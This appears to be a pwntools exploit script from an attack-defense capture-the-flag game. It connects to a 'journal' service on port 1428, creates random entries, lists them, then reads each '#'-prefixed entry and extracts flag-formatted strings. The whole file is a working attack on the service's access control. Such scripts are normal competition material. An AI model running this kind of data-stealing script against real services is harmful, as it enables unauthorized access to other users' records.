#!/usr/bin/env python

import re
from pwn import *
import sys

PORT = 1428


def generate_string(len = 16, alph = string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join([random.choice(alph) for _ in range(len)])


def main(ip):
    r = remote(ip, PORT)
    
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("> ")
    r.sendline(generate_string())
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("> ")
    r.sendline(generate_string())
    r.recvuntil("> ")
    r.sendline("4")
    data = r.recvuntil("> ")
    
    for line in data.split("\n"):
        if line.startswith("#"):
            r.sendline("2")
            r.recvuntil("> ")
            r.sendline(line[1:])
            data = r.recvuntil("> ")
            print(''.join(re.findall("[A-Z0-9]{31}=", data)))
            sys.stdout.flush()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: nsychev_journal_my_ass.py ip")
    ip = sys.argv[1]
    
    main(ip)